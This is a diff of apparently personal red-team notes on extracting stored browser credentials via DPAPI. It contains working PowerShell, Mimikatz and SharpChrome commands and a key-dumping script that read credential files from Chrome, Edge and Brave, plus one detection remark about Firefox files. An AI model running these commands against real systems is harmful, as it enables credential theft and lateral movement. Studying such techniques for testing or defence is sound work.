@@ -1,30 +1,71 @@
-## Web Browser Store Credentials
+# Web Browser Store Credentials
 Microsoft introduced Data Protection Application Programming Interface (DPAPI) in Windows environments as a method to encrypt and decrypt sensitive data such as credentials using the _CryptProtectData_ and _CryptUnprotectData_ functions. Browsers such as Chrome and Edge utilize DPAPI to encrypt credentials prior to storage. The master key is stored locally and can be decrypted with the password of the user, which then is used to decrypt DPAPI data blobs.
 
 In the world of red team operations, locations which credentials are stored are always a target as it will allow access to other applications or lateral movement. Organizations which are utilizing Microsoft Edge or Google Chrome for storage the credentials of their users are vulnerable due to the abuse of CryptUnprotectData API ([T1555.003](https://attack.mitre.org/techniques/T1555/003/)). It should be noted that reading credentials stored in browsers doesn’t require any form of elevation and it is challenging for defensive teams to detect due to the high volume of events which are generated in case of monitoring.
 
 Master keys are located in the following path and by default are not visible as these are classified as protected operating system files.
+## Extracting Master Keys from Browser
 
 ```
 C:\users\<user>\appdata\roaming\microsoft\protect\<SID>\<MasterKey>
 ```
-![[Pasted image 20250319221625.png]]![[Pasted image 20250319221634.png]]Mimikatz was the first tool that interacted with DPAPI, and has specific modules to perform decryption operations. However, the Mimikatz encrypted key parser is broken and therefore it can no longer be used to decrypt DPAPI blobs as it fails with a message of _No Alg and/or key handle_. Instead of using Mimikatz, it is feasible to harvest the encrypted key from “_Local State_” by executing the following command from a PowerShell console:
+![[Pasted image 20250319221625.png]]![[Pasted image 20250319221634.png]]
+
 ```
 (gc "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" | ConvertFrom-Json).os_crypt.encrypted_key
 ```
-![[Pasted image 20250319221728.png]]The encrypted key can be ingested in the Mimikatz _dpapi::chrome_ module to decrypt the contents of “_Login Data_“.
+
+![[Pasted image 20250319221728.png]]
+## Decrypting Keys
+Mimikatz was the first tool that interacted with DPAPI, and has specific modules to perform decryption operations. However, the Mimikatz encrypted key parser is broken and therefore it can no longer be used to decrypt DPAPI blobs as it fails with a message of _No Alg and/or key handle_. Instead of using Mimikatz, it is feasible to harvest the encrypted key from “_Local State_” by executing the following command from a PowerShell console:
+
+The encrypted key can be ingested in the Mimikatz _dpapi::chrome_ module to decrypt the contents of “_Login Data_“.
 
 ```
 dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /encryptedkey:[EncryptedKey] /unprotect
 ```
 
+# Chrome/Edge/Brave
+Because all these browsers are based on the chromium their file structure is similar and the command would work for all of them to retrieve the data.
+## Get Keys.ps1
+```
+$browsers = @{
+    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
+    "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
+}
+
+foreach ($browser in $browsers.Keys) {
+    try {
+        $path = $browsers[$browser]
+        $key = (Get-Content $path | ConvertFrom-Json).os_crypt.encrypted_key
+        Write-Output "$browser key: $key`n------------------"
+    } catch {
+        Write-Warning "$browser : Failed to read or parse encrypted_key"
+    }
+}
+```
+
+# Extracting Master Keys from FireFox
+## Location
+```
+C:\Users\<USER>\AppData\Roaming\Mozilla\Firefox\Profiles\<PROFILE>
+```
+Firefox does **not use the Chromium `Local State` file** or `os_crypt`. Instead, it stores encryption keys in:
+
+- `key4.db` — for master password and credentials
+- `logins.json` — stores encrypted usernames/passwords
+## Detection
+Any attempt to interact /download them two files key4.db and logins.json should be considered malicious
+# SharpChrome
 [SharpChrome](https://github.com/GhostPack/SharpDPAPI/) is part of the SharpDPAPI and targets sensitive information stored in Chromium based browsers such as Chrome, Edge and Brave. The tool will attempt to read and decrypt the AES key from the “_Local State_” file using the cryptographic function BCrypt. The API _CryptUnprotectData()_ is used to decrypt passwords stored in browsers.
 
 ```
-dotnet inline-execute SharpChrome logins
+SharpChrome.exe logins /browser:edge
 ```
 
-[![](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-sharpchrome.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-sharpchrome.png)
+![[Pasted image 20250518185456.png]]
+
 An alternative tool called [CredentialKatz](https://github.com/Meckazin/ChromeKatz) implements a different method as credentials are dumped directly from the credential manager of Chrome or Edge. This method is more evasive as it attempts to inject into an existing browser process and read credentials and doesn’t utilize DPAPI for decryption. Offline parsing of credentials is also supported via a minidump file. CredentialKatz harvest passwords from credential manager in plain-text by using the _PasswordReuseDetectorImpl_ class.
 
 ```
